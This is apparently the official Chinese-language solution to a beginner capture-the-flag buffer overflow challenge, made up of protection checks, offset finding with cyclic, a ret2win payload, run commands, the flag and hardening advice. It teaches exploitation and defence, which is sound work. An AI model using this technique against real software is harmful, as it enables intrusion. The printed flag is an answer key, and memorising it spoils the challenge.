# Buffer Overflow - 官方解法

## 解題步驟

### 1. 檢查保護機制

```bash
checksec chall
```

發現沒有任何保護機制（No RELRO, No Canary, NX disabled, No PIE）。

### 2. 分析程式

使用 IDA/Ghidra 或 gdb 反組譯程式：

```bash
gdb chall
pwndbg> disass main
pwndbg> disass vuln
pwndbg> disass win
```

發現：
- `vuln()` 使用危險函數 `gets()`
- 存在 `win()` 函數會直接輸出 flag
- 程式會主動洩漏 `win()` 的地址

### 3. 計算偏移

使用 cyclic pattern：

```python
from pwn import *
cyclic(100)
```

或在 gdb 中：

```bash
pwndbg> cyclic 100
pwndbg> run
# 輸入 cyclic pattern
pwndbg> cyclic -l <crash value>
```

得到偏移為 72 bytes。

### 4. 構造 Exploit

```python
payload = b'A' * 72 + p64(win_addr)
```

### 5. 執行

本地測試：
```bash
python3 exploit.py
```

遠端攻擊：
```bash
python3 exploit.py REMOTE HOST=<target> PORT=<port>
```

## Flag

```
FLAG{buff3r_0v3rfl0w_1s_34sy}
```

## 關鍵知識點

1. **Buffer Overflow 原理**：當輸入超過 buffer 大小時，會覆蓋 stack 上的其他資料
2. **Return Address**：函數返回地址存放在 stack 上，可以透過溢出來控制
3. **gets() 危險性**：不檢查長度，是最危險的輸入函數之一

## 防護建議

- 永遠不要使用 `gets()`，改用 `fgets()` 或 `scanf()` 並限制長度
- 編譯時開啟 Stack Canary (`-fstack-protector`)
- 開啟 NX (No-Execute) 保護
- 開啟 PIE (Position Independent Executable)
- 使用 ASLR (Address Space Layout Randomization)
